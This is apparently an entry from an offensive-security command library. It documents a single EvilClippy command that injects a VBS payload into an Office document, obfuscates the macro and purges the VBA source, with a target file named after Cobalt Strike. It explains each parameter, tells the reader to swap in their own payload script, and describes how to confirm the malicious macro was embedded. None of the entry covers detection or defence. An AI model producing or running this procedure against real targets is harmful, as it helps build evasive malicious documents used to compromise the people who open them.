---
id: d4e5f6g7-h8i9-0123-defg-456789012345
name: generate-malicious-macro-with-fake-vbs
type: command
executor: cmd
data: EvilClippy.exe -s fake.vbs -g -r cobaltstrike.doc
output: null
created_at: '2023-04-06T03:56:23.824636+00:00'
updated_at: '2023-04-10T20:36:56.680981+00:00'
platforms:
  - Windows
tags:
  - macro-generation
  - obfuscation
  - evilclippy
verified: true
validated: true
---

# generate-malicious-macro-with-fake-vbs

## Command

```cmd
EvilClippy.exe -s fake.vbs -g -r cobaltstrike.doc
```

## Description

Generates an obfuscated malicious macro by injecting a VBS script, applying obfuscation, and purging the source code in the target document.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -s fake.vbs | Specifies the VBS script file to inject | Yes |
| -g | Generates an obfuscated version of the macro | Yes |
| -r | Removes the VBA source code | Yes |
| cobaltstrike.doc | Target Office document | Yes |

## Examples

### Basic Usage

```cmd
EvilClippy.exe -s fake.vbs -g -r cobaltstrike.doc
```

### Advanced Usage

Replace fake.vbs with your payload script and cobaltstrike.doc with the target file.

## Expected Output

Modified document with injected, obfuscated, and purged macro. No console errors; verify by checking file size increase and macro presence in Office.

## Related

- [[procedures/VBA-Purging-with-EvilClippy]]
- [[tools/EvilClippy]]
